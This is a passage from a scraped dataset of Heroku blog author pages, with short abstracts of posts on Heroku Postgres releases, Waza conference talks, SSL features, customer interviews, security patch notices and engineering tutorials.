framework and stack to designing the application itself, to questions of when to worry about scalability. Your database shouldn't have to be one extra layer of concern. You should be able to put data in, trust it will stay safe, and finally get data back out – in a performant manner. Yet, with all the moving parts in your application, understanding issues in your database can be a huge pain. Today we're releasing pg-extras , a heroku toolbelt plugin, to provide additional insights into your database and to make working with your database easier. Get started by installing the plugin for the heroku... Read more Building Location Based Apps with Heroku PostGIS news April 30, 2013 Craig Kerstiens Smartphones have changed the world – everyone has a device in their pocket that’s constantly connected to the internet and knows where you are. Combined with the rise of digital mapping it has become commonplace to build applications that use GIS (Geographical Information Systems) to digitally represent our physical reality and our location in it. Storing and manipulating geospatial data has become an essential part of application development. If you are building a mobile app it’s becoming table stakes that you take advantage of location . Today we’re releasing PostGIS 2.0 into public beta as an extension to Heroku Postgres. Now all Heroku Postgres customers will be able to store and... Read more Postgres Version 9.2 is now Default news April 18, 2013 Craig Kerstiens Over a year ago we began working with the community as to how we could help to make Postgres better. Much of this came to fruition with PostgreSQL version 9.2 and three months ago we released support of Postgres 9.2 into GA. We've now seen many users begin taking advantage of the powerful features in this version including: Better visibility with pg_stat_statements URL support JSON datatype and more In these three months the 9.2 PostgreSQL version has had time to bake including several minor updates fixing a variety of bugs. Today as a result of all of this we're making 9.2 the default version when you provision a Heroku Postgres database. In addition to making 9.2 our new... Read more Heroku Postgres Databases Patched news April 04, 2013 Craig Kerstiens Heroku Postgres Databases have been patched Data is one of the most valuable assets of any company. As a database-as-a-service provider, one of our biggest responsibilities is ensuring your data is kept safe. A few weeks ago, one of the worst security vulnerabilities to date in PostgreSQL was discovered . To address this issue, Heroku deployed a point release upgrade across the entire Heroku Postgres service earlier this week. This resulted in a period of database unavailability, typically with a duration of less than one minute. Every database running on Heroku Postgres is now appropriately patched and is unaffected by the vulnerability. PostgreSQL Vulnerability Details The PostgreSQL... Read more Jacob Kaplan-Moss, Django Co-Creator, Talks Ecosystems at Heroku's Waza news March 09, 2013 Craig Kerstiens The value of a network is proportional to the square of the number of users connected to the system, according to Metcalfe’s law. Jacob Kaplan-Moss , co-creator of Django , highlights this as a value in creating communities or as he puts it, “ecosystems”. In his talk at Waza last week on building ecosystems, he went on to highlight three key principles of creating ecosystems: APIs to support extensibility Conservatism as a value Empowering the community Whether building a platform or a framework, these key principles ring true. Check out his talk or read more on creating ecosystems below: APIs to support extensibility You don’t choose to become an ecosystem, but you can choose to do... Read more Matz on Ruby 2.0 at Heroku's Waza news March 06, 2013 Craig Kerstiens Matz , the creator of Ruby, spoke at Waza for the 20th anniversary of the language and the release of Ruby 2.0 . If you weren't in the sold out crowd, not to worry. Information should flow free and experiences should be shared; in line with those concepts you can watch Matz's talk right here, then read about what's new in this version of Ruby and how to run it on Heroku. With slides available on speakerdeck Keep reading for more information on Ruby 2.0 or check out our first batch of videos from Waza 2013 . To stay up to date as we post new videos, follow us @heroku . Compatibility Iterating quickly means happier developers and happier customers. We optimize our platform to... Read more Idea to Delivery: Application Development in the Modern Age. Adam Wiggins at Waza 2012 [video] news February 27, 2013 Craig Kerstiens Great coders know their technology intimately. And they know how to choose it. Truly awesome application developers know more. They know the human side of technology. They know technique. They focus on their method—their practice. In 2000 Heroku co-founder and CTO Adam Wiggins saw this more clearly than ever before. He read The Pragmatic Programmer by Andy Hunt and Dave Thomas . The book, as Adam explains in this thought-provoking (and method-shifting) Waza talk, showed him that his work could not only be about technology. It HAD to be about technique. Heroku Co-founder, CTO and general badass, Adam Wiggins Adam discusses techniques—historical ones such as agile development and the... Read more Concurrency is not Parallelism. Rob Pike at Waza 2012 [video] news February 24, 2013 Craig Kerstiens In planning Waza 2013 we went back to reflect on last year’s speakers. And we want to make the talks readily available to anybody who could not make it last year—or who wants a refresher. Check back soon for more talks from Waza 2012. And we hope to see you in person at Waza 2013 coming up FAST on Feb. 28 in San Francisco. In a world of evolving languages, frameworks and development patterns, we developers must continually improve our craft. Innovative developers already have jumped on board many of these shifts. We’ve seen this with the adoption of more agile frameworks (such as Rails, Django, and Play). We’ve seen it too with a shift towards asynchronous programming patterns such as in... Read more Learn from your Data with Dataclips 2.0 news January 17, 2013 Craig Kerstiens An organization's data is its most valuable asset. Unfortunately, that data is usually trapped inside a database with few ways to access it by a privileged handful of people. Too often reports are manually generated and their results pasted into emails; dashboards get built but rapidly become outdated and never answer the right questions. We have so many great tools for collaborating around our source code, why is data still in the dark ages? At Heroku Postgres, we believe that your data should flow like water. Only the most up-to-date data should be available any time you have a decision to make. Instead of being trapped in disparate systems, you should be able to move data smoothly... Read more Postgres 9.2 – The Database You Helped Build news December 06, 2012 Craig Kerstiens Hosting your data on one of the largest fleets of databases in the world comes with certain advantages. One of those benefits is that we can aggregate the collective pain points that face our users and work within the Postgres community to help find solutions to them. In the previous year we worked very closely with the broader Postgres community to build features, fix bugs, and resolve pain points. You've already seen some of the results of that work in the form of extension support on Heroku and query cancellation . With the 9.2 release we're delighted to say that with your help, we've been able to bring you a whole host of new power and simplicity in your database. Effective... Read more Fork Your Application's Data (Not Just Your Code) news November 08, 2012 Craig Kerstiens Git and Github revolutionized software development by letting you fork your source repository with a single click. Wouldn't it be great to be able to do the same thing with your database? In the same way you can fork your code you can now fork your data. Fork changes the way you can work with your data, making it a snap to provision a clone of your production database. The technology is simple, safe, and robust, and thanks to Heroku Postgres' cloud architecture, places no load on your primary database. Today, we’re announcing the release of this functionality into General Availability. Forking your data opens up whole new ways of developing software. We've seen our users... Read more Announcing Follow news October 25, 2012 Craig Kerstiens Today we’re releasing the ability to follow your Heroku Postgres Database into General Availability: this lets you easily create multiple read-only asynchronous replicas of your database, known as followers. After an extended beta period during which over 3,000 followers were created, many of which help power core Heroku systems, we’re excited to make the ability to safely and easily scale out access to your data available to all Heroku Postgres users. Followers enable some great use cases: Easy read traffic scaling Fast upgrades Higher availability One use case that has historically been challenging in database management is setting up a read replica, often referred to as a read slave.... Read more New Heroku Postgres Plans GA news August 01, 2012 Craig Kerstiens In past months we've released the public beta of our dev, basic , crane and kappa plans. We've received positive feedback from everyone using the new database plans. Based on this strong positive response and adoption during the beta, we're officially moving these plans to general availability starting today. In conjunction with the GA of our starter tier , we're deprecating our shared database plans. The new dev and basic plans offer many improvements including Postgres 9.1 with schemaless SQL, data clips , direct psql access, and a web management interface . Beginning August 8, 2012, we will begin migrating shared database users over to the new starter tier. Users may... Read more SSL Endpoint GA news May 18, 2012 Craig Kerstiens Earlier this month we released the public beta of an improved SSL solution, SSL Endpoint . We've received positive feedback from everyone using the new SSL solution. Based on this strong positive response and adoption during the beta, we're officially moving SSL Endpoint to general availability starting today. It is now the recommended option for any app which needs SSL on a custom domain. In conjunction with SSL Endpoint's GA status, we're consolidating and simplifying our SSL product lineup by deprecating all of the older SSL add-ons: SNI, Hostname SSL, and IP SSL. SSL Endpoint is easier to use, more robust, faster to provision, and offers more features (such as ... Read more Announcing Better SSL For Your App news May 03, 2012 Craig Kerstiens SSL is a crucial part of any web app with a login session. As Firesheep demonstrated, HTTPS everywhere is the path forward for modern web apps. Heroku follows this with our own login-protected apps, from the management interface to the Dev Center to the Toolbelt . Announcing Better SSL For Your App Today, we're announcing two new features to make it as easy as possible for you to secure your app running on Heroku with SSL. First, all apps now have piggyback SSL by default. Prepend https to the hostname for any Heroku app ( https://yourapp.herokuapp.com for Cedar and https://yourapp.heroku.com for Aspen/Bamboo ) and you'll piggyback on the *.herokuapp.com SSL certificate. No special... Read more", "date": "2015-07-07,"},
{"website": "Heroku", "title": null, "author": ["Courtney Correll"], "link": "https://blog.heroku.com/authors/courtney-correll", "abstract": "Waza 2013 news November 05, 2012 Courtney Correll Waza Returns to San Francisco in February 2013 Heroku's developer event, Waza , returns on Thursday, February 28th, 2013 to the Concourse in San Francisco. Sign up to be notified when tickets are available. What is Waza? Waza (技) is the Japanese word for art and technique. At Heroku, we believe that software development is a craft. Building modern technologies that engage and inspire is an art, with techniques shared, passed on, and honed in the process of creation. Waza is an event where developers can find inspiration – about what’s happening in technology, what’s happening at Heroku, how people are thinking about the future, and how the landscape of technology is changing.... Read more", "date": "2012-11-05,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Corey Purcell"], "link": "https://blog.heroku.com/authors/corey-purcell", "abstract": "Up to 75% Faster Maintenances with Heroku Postgres and Redis Premium Plans engineering August 28, 2019 Corey Purcell As outlined in a previous blog post , Heroku Data services undergo routine maintenances for security and patching. In this post, we describe the process used to minimize downtime for Heroku Postgres and Heroku Redis premium ‘High Availability’ plans and how we optimized the process to perform up to 75% faster. Data Services Architecture High availability plans for Postgres and Redis are designed to have two database instances running at the same time. One is a writeable primary database server and the other is a read-only hidden standby. Since the standby is hidden, customers cannot access it during normal operations. Before starting a planned maintenance, we do our best to ensure... Read more", "date": "2019-08-28,"},
{"website": "Heroku", "title": null, "author": ["Christine Dodrill"], "link": "https://blog.heroku.com/authors/christine-dodrill", "abstract": "How to Make a Progressive Web App From Your Existing Website engineering March 05, 2019 Christine Dodrill Progressive web apps enable websites to function more like native mobile apps in exchange for some flexibility. You get native mobile app functionality (or close to it) without all the overhead of app store approvals and tons of platform-specific native code. Users can install a progressive web app to their home screen and launch it just like a native app. However, the app is launched into a pseudo-app frame that has some restrictions and only allows access to pages that are sub-paths of the initial path of the... Read more", "date": "2019-03-05,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura"], "link": "https://blog.heroku.com/authors/christie-fidura", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more", "date": "2020-06-29,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Chris Stolt", "Chris Stolt"], "link": "https://blog.heroku.com/authors/chris-stolt", "abstract": "Improving Heroku Postgres with Support Data news August 06, 2013 Chris Stolt We continuously use support data to identify high impact issues in our platform. Over the past couple of weeks in July, we reduced the volume of support inquiries related to Heroku Postgres by over a third — even as overall usage of the product increased. In this post, we'll tell you that story and a bit about how we do support here at Heroku. Identifying High-Impact Support Issues The way we approach customer support at Heroku is two-fold. On the surface, we’re here to answer your questions and help you fix issues with your apps. We also play an integral role advocating our customers’ needs within the company. The best support is the one you don't have to use, and as such, we... Read more Building Apps Efficiently on Heroku news June 12, 2013 Chris Stolt Whether you’re building your initial prototype or running a large scale profitable business, there will be times where you will have questions about building, maintaining, or troubleshooting your application. One of our goals is to help make your business successful by empowering you to build quality software with best practices, clear documentation on a stable erosion-resistant platform. When in doubt, there are several channels here at Heroku available to help you get the support you need. Getting Started Brand new to development or just new to Heroku there’s a place for you in the Dev Center . As you’re getting started you likely want to setup your application so you can get better... Read more", "date": "2013-08-06,"},
{"website": "Heroku", "title": null, "author": ["Email", "Chris Marino", "Srini Nirmalgandhi"], "link": "https://blog.heroku.com/authors/chris-marino", "abstract": "Extend Flows with Heroku Compute: An Event-Driven Pattern engineering December 11, 2020 Chris Marino and Srini Nirmalgandhi This post previously appeared on the Salesforce Architects blog. Event-driven application architectures have proven to be effective for implementing enterprise solutions using loosely coupled services that interact by exchanging asynchronous events. Salesforce enables event-driven architectures (EDAs) with Platform Events and Change Data Capture (CDC) events as well as triggers and Apex callouts, which makes the Salesforce Platform a great way to build all of your digital customer experiences . This post is the first in a series that covers various EDA patterns, considerations for using them, and examples deployed on the Salesforce Platform. Expanding the event-driven architecture of the... Read more", "date": "2020-12-11,"},
{"website": "Heroku", "title": null, "author": ["Email", "chris le roy", "chris le roy"], "link": "https://blog.heroku.com/authors/chris-le-roy", "abstract": "Terrier: An Open-Source Tool for Identifying and Analyzing Container and Image Components engineering January 14, 2020 chris le roy As part of our Blackhat Europe talk “Reverse Engineering and Exploiting Builds in the Cloud” we publicly released a new tool called Terrier. Announcing Terrier: An open-source tool for identifying and analysing container and image components. In this blog post, I am going to show you how Terrier can help you identify and verify container and image components for a wide variety of use-cases, be it from a supply-chain perspective or forensics perspective. Terrier can be found on Github ... Read more Applying Seccomp Filters at Runtime for Go Binaries engineering August 29, 2018 chris le roy Seccomp (short for security computing mode) is a useful feature provided by the Linux kernel since 2.6.12 and is used to control the syscalls made by a process. Seccomp has been implemented by numerous projects such as Docker, Android, OpenSSH and Firefox to name a few. In this blog post, I am going to show you how you can implement your own seccomp filters, at runtime, for a Go binary on your Dyno. Why Use Seccomp Filters? By default, when you run a process on your Dyno, it is limited by which syscalls it can make because the Dyno has been implemented with a restricted set of seccomp filters. This means, for example, that your process has access to syscalls A,B and C and not H and J... Read more", "date": "2020-01-14,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "Facebook", "GitHub", "LinkedIn", "Owen Ou", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle", "Chris Castle"], "link": "https://blog.heroku.com/authors/chris-castle", "abstract": "Building a GraphQL API in JavaScript engineering June 24, 2020 Owen Ou and Chris Castle Over the last few years, GraphQL has emerged as a very popular API specification that focuses on making data fetching easier for clients, whether the clients are a front-end or a third-party. In a traditional REST-based API approach, the client makes a request, and the server dictates the response: $ curl https://api.heroku.space/users/1 { \"id\": 1, \"name\": \"Luke\", \"email\": \"luke@heroku.space\", \"addresses\": [ { \"street\": \"1234 Rodeo Drive\", \"city\": \"Los Angeles\", \"country\": \"USA\" } ] } But, in GraphQL, the client determines precisely the data it wants from the server.... Read more Evolving Alongside your Tech Stack engineering April 29, 2020 Chris Castle This blog post is adapted from a discussion during an episode of our podcast, Code[ish] . Over the last twenty years, software development has advanced so rapidly that it's possible to create amazing user experiences, powerful machine learning algorithms, and memory efficient applications with incredible ease. But as the capabilities tech provides has changed, so too have the requirements of individual developers morphed to encompass a variety of skills. Not only should you be writing efficient code; you need to understand how that code communicates with all the other systems involved and make it all work together. In this post, we'll explore how you can stay on top of the changing... Read more Beyond Web and Worker: Evolution of the Modern Web App on Heroku engineering August 14, 2018 Chris Castle This is the first in a series of blog posts examining the evolution of web app architecture over the past 10 years. This post examines the forces that have driven the architectural changes and a high-level view of a new architecture. In future posts, we’ll zoom in to details of specific parts of the system. The standard web application architecture suitable for many organizations has changed drastically in the past 10 years. Back in Heroku’s early days in 2008, a standard web application architecture consisted of a web process type to respond to HTTP requests, a database to persist data, and a worker process type plus Redis to manage a job queue . Read more Yarn: Lock It in for Deterministic Dependency Resolution news March 02, 2017 Chris Castle Choices are an important part of a healthy open source software community. That’s why we’re excited about Yarn, a new package manager that addresses many of the problems with Node’s default package manager, npm . While npm has done a fantastic job creating a large and vibrant JavaScript ecosystem, I want to share why Yarn is an important addition to the Node.js ecosystem, how it will improve your Node.js development experience, and how Heroku has incorporated it into the build process for your Heroku apps. We began testing Yarn almost immediately after it was released, and began fully supporting it on December 16. About Yarn Yarn was released in October 2016 and made a big splash... Read more Apache Kafka, Data Pipelines, and Functional Reactive Programming with Node.js news November 29, 2016 Chris Castle Heroku recently released a managed Apache Kafka offering. As a Node.js developer, I wanted to demystify Kafka by sharing a simple yet practical use case with the many Node.js developers who are curious how this technology might be useful. At Heroku we use Kafka internally for a number of uses including data pipelines . I thought that would be a good place to start. When it comes to actual examples, Java and Scala get all the love in the Kafka world. Of course, these are powerful languages, but I wanted to explore Kafka from the perspective of Node.js. While there are no technical limitations to using Node.js with Kafka, I was unable to find many examples of their use together in tutorials,... Read more Powering the real food revolution with IoT, MQTT, and Heroku: an Interview with Freight Farms news October 13, 2016 Chris Castle Kyle Seaman is Director of Farm Technology for Freight Farms, producer of pre-assembled, IoT-enabled, hydroponic farms inside repurposed freight containers. Read the Freight Farms customer story to learn more about how Heroku has helped the company scale their business. What is Freight Farms? Our flagship product, The Leafy Green Machine (LGM), is a complete, commercial-ready, hydroponic growing system assembled inside a repurposed shipping container. Each of our 100+ farms is connected to an IoT network built on Heroku. Tell us about your stack. We’re running the open source version of the Parse server on Heroku . Our stack is mostly JavaScript: MongoDB along with a Node.js API. We... Read more Running the Bonobos Stack on Heroku: Interview with Austen Ito news September 08, 2016 Chris Castle Austen Ito is a software engineer at leading online fashion brand Bonobos, based in New York. Read our Bonobos customer story for more information about how Heroku has helped their business. What do you have running on Heroku? We’re running just about everything on Heroku, including our Bonobos.com website, cross-app messaging services, an API for our ERP, as well as some internal tools. The only pieces that are not on Heroku are the Data Science and ERP components. We’re also using Desk.com for customer service queuing. Walk us through your stack We use a mix of Backbone and React in terms of JavaScript frameworks on the front end. Some of our legacy work is in Backbone and our newer... Read more How Combatant Gentlemen Solved Service Discovery Using Heroku Private Spaces news July 21, 2016 Chris Castle Scott Raio is Co-Founder and CTO of Combatant Gentlemen , a design-to-delivery menswear e-commerce brand. Read our Combatant Gentlemen customer story to learn more about how Heroku helped them build a successful online business. What microservices are you running in Heroku Private Spaces? We’ve written an individual service for every business use case. For example, we have services for order processing, product catalog, account management, authentication, swatch display, POs, logistics, payments, etc. With all these different services, we chose Heroku Private Spaces as a way to make service discovery easier. We’re currently running about 25 services, which is a relatively small number... Read more How Emarsys Approaches Service Sizing on Heroku news July 07, 2016 Chris Castle Based in Budapest, Hungary, Andras Fincza (Head of Engineering) and Rafael Ördög (Technical Lead) work for Emarsys , a global marketing automation platform. Read our Emarsys customer story to learn more about their migration experience on Heroku. How did you introduce microservices at Emarsys? We take an evolutionary approach to our architecture. Our marketing automation platform was originally designed as a monolithic system built in PHP and MySQL and running on in-house infrastructure. We were running two major services on our in-house infrastructure: one for HDS (historical data service) and the other for smart insights and analysis. However, it was hard to grow the platform... Read more How Belly Scales Using API Proxies with their Microservices Architecture: Interview with Darby Frey news June 23, 2016 Chris Castle Darby Frey is Director of Platform Engineering at Belly, the leading loyalty marketing platform in the U.S. For more information, visit www.bellycard.com or read our Belly customer story to learn more about how Heroku has helped Belly scale their business. How did you approach migrating to a microservices architecture? Originally, we built the entire business on one Rails app. Then a couple years ago, we pivoted to a microservices approach. It is still a work in progress, but we’re migrating components of the monolithic app whenever it makes sense. For example, when we need to add or expand a feature, or if we need to scale something independently, then it makes sense to pull that out... Read more", "date": "2020-06-24,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura", "Charlie Gleason", "Charlie Gleason", "Charlie Gleason"], "link": "https://blog.heroku.com/authors/charlie-gleason", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more Climbing Up The Walls:  (Not) Remotely Business As Usual life May 29, 2020 Charlie Gleason We are living in unprecedented times, and many of us are grappling with a really similar set of complicated and, at times exhausting, emotions. I've been thinking about this a lot since my conversation with Margaret Francis, the SVP of Platform Data Services at Salesforce and former Heroku GM, in our recent podcast for Code[ish] . At Heroku, we have gone from roughly over half of our team being remote, to all of our team being remote. We, along with people all over the world, have suddenly found ourselves working from living rooms, laundry rooms, gardens, garages, sheds, and kitchens. It can be overwhelming at times—learning new skills and adjusting old ones—so we wanted to step back... Read more On Making Work Less Remote: How the Heroku Team Works Together life May 13, 2019 Charlie Gleason At a rough estimate over half the team at Heroku are remote workers, including myself. We are affectionately called Remokai. We hail from a dizzying number of countries, communicating through email, video calls, and instant messages, from cities, towns, beaches, and parks—a few weeks ago I had a meeting while cycling through central London. It's an incredible mix of people, from a diverse range of backgrounds, living and working in ways that would have been impossible only a short time ago. Read more A Rock Solid, Modern Web Stack—Rails 5 API + ActiveAdmin + Create React App on Heroku engineering May 16, 2018 Charlie Gleason How to blend a rock-solid CMS and API with the absolute best in front-end tooling, built as a single project and hosted seamlessly on Heroku. Rails is an incredible framework, but modern web development has moved to the front-end, meaning sometimes you don’t need all the bulk of the asset pipeline and the templating system. In Rails 5 you can now create an API-only Rails app, meaning you can build your front-end however you like—using Create React App, for example. It’s no longer 100% omakase . Read more", "date": "2020-06-29,"},
{"website": "Heroku", "title": null, "author": ["Charles Hooper"], "link": "https://blog.heroku.com/authors/charles-hooper", "abstract": "Behind the Heroku Platform: How We Create Non-events for Customers news October 07, 2014 Charles Hooper As an SRE (Service Reliability Engineer) at Heroku, one of the things I’m exposed to is how much work happens behind the scenes in order to create what we call “non-events” for you, our users. A non-event is turning something that would typically create work for an application hosted on traditional infrastructure into something that the user won’t even notice. This is something we put a lot of energy into because we believe in letting our users run apps instead of managing infrastructure. We make this investment because we know that for every hour you spend managing infrastructure, that’s an hour less spent on building or maintaining your application. We know that you need to be able to... Read more", "date": "2014-10-07,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Casey Watts"], "link": "https://blog.heroku.com/authors/casey-watts", "abstract": "CLI Flags in Practice + How to Make Your Own CLI Command with oclif engineering May 09, 2019 Casey Watts Editor's note: If you like CLIs, you should check out oclifconf taking place on Friday, May 31st in San Francisco. It’s the first community get-together for oclif! Space is limited so let us know soon if you are interested in joining. What is it that makes working from the command line so empowering? It can feel archaic at times, sure, but when you remember the right sequence of words, characters, and symbols for what you’re trying to do, it hits you with a sense of accomplishment and mastery over your tools that no graphical interface can compete with. So what better way to continue your adventures as a developer than by developing your own CLI tool? In this post, we’ll go over what... Read more", "date": "2019-05-09,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "Ed Morley", "Casey", "Casey"], "link": "https://blog.heroku.com/authors/casey-faist", "abstract": "From Project to Productionized with Python engineering June 22, 2020 Ed Morley and Casey We hope that you and your loved ones are staying safe from the COVID-19 pandemic. As a result of its effect on large gatherings, PyCon 2020 was cancelled changed to an online event . Although not being able to gather in person was disheartening for organizers, speakers, and attendees, the Python community shared virtual high-fives and hugs with PyCon US 2020 Online. We recorded our planned Heroku workshop for the event , on which this blog post is based. Casey Faist: Hi, I'm Casey Faist the queen Pythonista at Heroku and this is From Project to Productionized on Heroku. Now, I wish we could be together today. I wish we could be swapping stories and coding together. I wish we could... Read more Getting to Know Python 3.7: Data Classes, async/await and More! engineering April 29, 2019 Casey If you're like me, or like many other Python developers, you've probably lived (and maybe migrated) through a few version releases. Python 3.7(.3), one of the latest releases, includes some impressive new language features that help to keep Python one of the easiest, and most powerful languages out there. If you're already using a Python 3.x version, you should consider upgrading to Python 3.7. Read on to learn more about some of the exciting features and improvements. Data Classes One of the most tedious parts about working with Python prior to 3.7 in an object-oriented way was creating classes to represent data in your application. Prior to Python 3.7, you would have to... Read more", "date": "2020-06-22,"},
{"website": "Heroku", "title": null, "author": ["Email", "Camille Baldock", "Camille Baldock", "Camille Baldock", "Camille Baldock"], "link": "https://blog.heroku.com/authors/camille-baldock", "abstract": "Rolling the Heroku Redis Fleet engineering June 27, 2018 Camille Baldock Over the past few weeks, Heroku proactively updated our entire Redis fleet with a version of Redis not vulnerable to CVE-2018-11218 . This was an embargoed vulnerability, so we did this work without notifying our customers about the underlying cause. As always, our goal was to update all Heroku Redis instances well before the embargo expired. As a Data Infrastructure Engineer at Heroku, I wanted to share how we manage large fleet operations such as this one. The most important aspect of our job is keeping customers safe from security vulnerabilities, while also minimizing disruption and downtime. Those two objectives are often at odds with each other, so we work hard to reduce the impact... Read more Heroku Postgres PGX: Bigger Databases, Improved Infrastructure, Same Price news January 17, 2018 Camille Baldock Today, we’re excited to announce a major update to Heroku Postgres with a new lineup of production plans. These plans are the first component of Heroku Postgres PGX, the next generation of our managed Postgres solution. PGX Plans introduce larger database sizes, more generous resource allocations, and a broader set of options to suit your needs and to help your applications scale more smoothly. PGX Plans are generally available as of today, and all new Postgres databases will be created on our latest generation of Postgres infrastructure. Underneath the hood, we've upgraded the CPU, memory, storage, and networking aspects to ensure your Postgres database is running smoothly at scale.... Read more PostgreSQL 10 Generally Available on Heroku news December 14, 2017 Camille Baldock Today, we're happy to announce full support for PostgreSQL 10, opening our managed Postgres solution to the full slate of features released after a successful two-month Beta period . PostgreSQL 10 is now the default version for all new provisioned Heroku Postgres databases. All Postgres extensions, tooling, and integration with the Heroku developer experience are ready to use, giving you the power of PostgreSQL 10 with the ease and usability of Heroku for building data-centric applications. We'd like to re-emphasize a few features - among the many released in Postgres 10 - that we are particularly excited about. Read more PostgreSQL 10 Now Available in Beta on Heroku Postgres news October 17, 2017 Camille Baldock Earlier this month, PostgreSQL 10.0 was released . Today, we are excited to announce PostgreSQL 10 is available in beta on Heroku, bringing a number of notable feature and performance improvements to our managed PostgreSQL database service. The beta provides customers who want to try out the new release an easy way to do so, while customers who are happy with the current version can continue to stay on version 9.6 until we make version 10 generally available. Also, new databases will continue to default to version 9.6 until we release version 10 to GA. Read more", "date": "2018-06-27,"},
{"website": "Heroku", "title": null, "author": ["https://www.calebhearth.com", "Email", "Twitter", "GitHub", "LinkedIn", "Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura", "Caleb Hearth", "Caleb Hearth"], "link": "https://blog.heroku.com/authors/caleb-thompson", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources life June 29, 2020 Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How... Read more Using HTTP Headers to Secure Your Site engineering March 01, 2018 Caleb Hearth Observatory by Mozilla helps websites by teaching developers, system administrators, and security professionals how to configure their sites safely and securely. Let's take a look at the scores Observatory gives for a fairly straightforward Static Buildpack app, https://2017.keeprubyweird.com . Test Scores Test Pass Score Explanation Content Security Policy -25 Content Security Policy (CSP) header not implemented Cookies ― 0 No cookies detected Cross-origin Resource Sharing 0 Content is not visible via cross-origin resource sharing (CORS) files or headers HTTP Public Key Pinning ― 0 HTTP Public Key Pinning (HPKP) header not implemented (optional) HTTP Strict Transport... Read more Jekyll on Heroku engineering December 13, 2017 Caleb Hearth Jekyll , the static website generator written in Ruby and popularized by GitHub, is a great candidate for being run on Heroku. Originally built to run on GitHub Pages, running Jekyll on Heroku allows you to take advantage of Jekyll’s powerful plugin system to do more than convert Markdown to HTML. On my blog, I have plugins to download my Goodreads current and recently read books and to generate Open Graph images for posts. That said, it’s not straightforward to get up and running on Heroku without using jekyll serve to do the heavy lifting. jekyll serve uses Ruby’s built-in, single threaded web server WEBrick , but a public site should be using a web server more suited for production, like... Read more", "date": "2020-06-29,"},
{"website": "Heroku", "title": null, "author": ["Byron Sebastian", "Byron Sebastian", "Byron Sebastian"], "link": "https://blog.heroku.com/authors/byron-sebastian", "abstract": "Codon Security Issue and Response news July 03, 2012 Byron Sebastian Heroku learned of and resolved a security vulnerability last week. We want to report this to you, describe how we responded to the incident, and reiterate our commitment to constantly improving the security and integrity of your data and source code. On Tuesday, June 26, Jonathan Rudenberg notified us about an issue in our Codon build system. The Codon build system is responsible for receiving application code from Git and preparing it for execution on the Aspen and Cedar stacks. This vulnerability exposed a number of sensitive credentials which could be used to obtain data and source code of customer applications. Upon receiving notification we rolled the most sensitive credentials. An... Read more Ignition! news May 10, 2010 Byron Sebastian We can’t be happier to announce that we recently closed a $10 million Series B round of investment led by Ignition Partners. We’re planning to use the money to further expand our platform , turbo-charge partner programs for add-on providers and consultancies, and accelerate our go-to-market programs. The growth and excitement that we’ve seen at Heroku, particularly in 2010, has been incredibly energizing for all of us. We talk a lot about numbers – the 60,000-plus apps running on our platform gets quoted a lot recently – but even more motivating are the creative forces that the platform is unleashing. Developers and companies are building and running some... Read more Heroku Directions news October 22, 2009 Byron Sebastian It’s great to be a part of Heroku and to get the welcome from James and team as well as from the various customers, partners, and developers I’ve spoken with over the past few weeks. Heroku, the Ruby community at large, and the “cloud” market in general are growing and evolving quickly. As you can tell, we have a lot of exciting applications being deployed on our platform and are constantly working to improve and expand our offerings. I wanted to use my first blog post with the company to talk specifically about areas where we are going to be super focused over the coming months: 1) Making Heroku’s growing ecosystem work for you. We’ve seen great... Read more", "date": "2012-07-03,"},
